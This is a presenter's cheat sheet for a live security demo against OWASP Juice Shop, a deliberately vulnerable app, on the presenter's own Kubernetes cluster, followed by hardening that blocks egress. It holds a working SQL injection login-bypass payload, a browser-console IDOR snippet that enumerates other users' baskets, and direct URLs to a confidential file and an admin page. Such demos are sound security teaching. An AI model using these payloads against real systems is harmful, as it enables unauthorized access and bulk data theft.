# Demo Run-of-Show Cheat Sheet

Copy-paste commands for the live demo, in order, tagged by environment.

```
================================================================
  UPWIND DEMO — RUN-OF-SHOW CHEAT SHEET
  Env tags:  [PS] PowerShell   [BROWSER] address bar/UI
             [DEVTOOLS] browser F12 Console   [SLIDE] just talk
================================================================

LB URL (re-fetch if you rebuilt the cluster):
  http://a759ede5a033d4421b00bdd107863390-1869063510.us-east-1.elb.amazonaws.com

----------------------------------------------------------------
PRE-DEMO (do BEFORE you present — not on stage)
----------------------------------------------------------------

[PS] Set the URL variable for the session:
  $JUICE = "http://a759ede5a033d4421b00bdd107863390-1869063510.us-east-1.elb.amazonaws.com"

[PS] Confirm app is up (expect HTTP 200):
  curl.exe -s -o NUL -w "%{http_code}`n" $JUICE

[PS] REQUIRED: enable NetworkPolicy enforcement (cluster has it OFF).
     Without this the egress step won't block. Wait ~1-2 min after.
  aws eks update-addon --cluster-name <cluster> --addon-name vpc-cni --configuration-values '{"enableNetworkPolicy":"true"}'

[PS] Pre-test the hardened rollout reaches Ready, then REVERT so you
     start the demo on the vulnerable baseline:
  kubectl apply -f k8s/hardened/juice-shop-hardened.yaml
  kubectl -n juice-shop rollout status deploy/juice-shop --timeout=120s
  kubectl -n juice-shop get pods          # expect Running 1/1
  kubectl apply -f k8s/juice-shop.yaml    # REVERT to baseline for the live demo
  kubectl delete networkpolicy --all -n juice-shop

Open browser to $JUICE, keep DevTools (F12) on the Network tab.
Have a backup screen recording of each exploit ready.

----------------------------------------------------------------
SLIDE 7  —  VULN 1: A03 INJECTION  (SQLi auth bypass)   ~4 min
----------------------------------------------------------------

[BROWSER] On the Login page, enter:
  Email:    ' OR 1=1--
  Password: anything
  -> logs in as admin (first user in table)

[PS] Same thing raw, to show the request (returns an admin token).
     NOTE: build JSON from an object so the quote isn't doubled:
  $body = @{ email = "' OR 1=1--"; password = "x" } | ConvertTo-Json
  Invoke-RestMethod -Uri "$JUICE/rest/user/login" -Method Post -ContentType 'application/json' -Body $body

Say: full admin session, no credentials. A UNION payload dumps tables.

----------------------------------------------------------------
SLIDE 9  —  VULN 2: A01 BROKEN ACCESS CONTROL  (IDOR)   ~4 min
----------------------------------------------------------------

Log in as a NORMAL throwaway user first (Account > Register, or
demo@demo.com / demo123) so the point is horizontal access.

BEAT 1 — API leaks raw data:
[DEVTOOLS] (Console, on the $JUICE tab):
  let t = localStorage.getItem('token'); try { t = JSON.parse(t); } catch (e) {}
  fetch('/rest/basket/1', { headers: { Authorization: 'Bearer ' + t } }).then(r => r.json()).then(console.log);
  -> expand result: products + a UserId that isn't yours.
  Change '1' to '2' and re-run to show enumeration.
  (Baskets 1-6 are populated; basket 1 = admin, 3 items. 7+ empty.)

BEAT 2 — the app renders someone else's cart:
[DEVTOOLS] (Console):
  sessionStorage.setItem('bid', '1');
  -> then click "Your Basket" / reload. UI shows basket 1's items.
  (If sessionStorage bid is null, use: localStorage.setItem('bid','1'))

Say: enumerable across all users = bulk PII harvest, not one cart.

----------------------------------------------------------------
SLIDE 11 —  VULN 3: A05 SECURITY MISCONFIG              ~3 min
----------------------------------------------------------------

[BROWSER] Confidential file, no auth needed (paste in address bar):
  http://a759ede5a033d4421b00bdd107863390-1869063510.us-east-1.elb.amazonaws.com/ftp/acquisitions.md

[BROWSER] Admin surface (be logged in as admin from Vuln 1 so it
          POPULATES; anonymous gets bounced by the client-side guard):
  http://a759ede5a033d4421b00bdd107863390-1869063510.us-east-1.elb.amazonaws.com/#/administration

Say: misconfig is usually the first foothold that chains into the rest.

----------------------------------------------------------------
SLIDE 13 —  HARDENING IN ACTION                         ~4 min
----------------------------------------------------------------

STEP A — show egress works NOW (before hardening). Run from [PS]:
  kubectl -n juice-shop exec deploy/juice-shop -- /nodejs/bin/node -e "const https=require('https');const r=https.get('https://example.com',res=>{console.log('ALLOWED - reached internet (HTTP '+res.statusCode+')');process.exit(0)});r.on('error',e=>{console.log('BLOCKED - '+e.code);process.exit(0)});r.setTimeout(5000,()=>{console.log('BLOCKED - timed out, no egress');r.destroy();process.exit(0)});"
  -> expect: ALLOWED - reached internet (HTTP 200)

STEP B — apply the hardened overlay [PS] (narrate slide 13 bullets
         for ~30-60s while it rolls):
  kubectl label ns juice-shop pod-security.kubernetes.io/enforce=restricted --overwrite
  kubectl apply -f k8s/hardened/juice-shop-hardened.yaml
  kubectl -n juice-shop rollout status deploy/juice-shop --timeout=120s

STEP C — (optional) prove the SQLi STILL works: re-run the Slide 7
         [PS] Invoke-RestMethod. It still returns a token.
  Say: "Hardening didn't patch the code — the bug survives."

STEP D — re-run the SAME egress probe [PS] (identical to Step A):
  kubectl -n juice-shop exec deploy/juice-shop -- /nodejs/bin/node -e "const https=require('https');const r=https.get('https://example.com',res=>{console.log('ALLOWED - reached internet (HTTP '+res.statusCode+')');process.exit(0)});r.on('error',e=>{console.log('BLOCKED - '+e.code);process.exit(0)});r.setTimeout(5000,()=>{console.log('BLOCKED - timed out, no egress');r.destroy();process.exit(0)});"
  -> expect: BLOCKED - timed out, no egress
  Say: "The damage doesn't. Bug's still there, but it can't phone home."

================================================================
GOTCHAS
- Run kubectl egress probe from PowerShell, NOT Git Bash (Bash
  mangles /nodejs/bin/node). If forced to use Bash, prefix:
  MSYS_NO_PATHCONV=1 kubectl ...
- Image is distroless: no shell, no curl, node off PATH -> must use
  /nodejs/bin/node. Don't use `sh -c 'curl ...'`.
- Egress only BLOCKS if NetworkPolicy enforcement is ON (pre-demo step).
- IDOR token in localStorage is quote-wrapped -> JSON.parse unwraps it.
================================================================
```

## Notes / verify before relying on these

- **`kubectl apply -f k8s/juice-shop.yaml` as the revert** assumes that's the
  un-hardened baseline manifest — confirm it restores the vulnerable Deployment and
  removes the read-only / securityContext settings.
- **`curl.exe`** is deliberate — PowerShell's `curl` is an alias for `Invoke-WebRequest`
  with different flags, so `curl.exe` forces the real binary.
- The egress probe and image internals (`/nodejs/bin/node`, distroless, no shell) were
  validated live against `bkimminich/juice-shop:v17.1.1`; NetworkPolicy enforcement was
  found **disabled** on the cluster and must be enabled for the BLOCKED result.
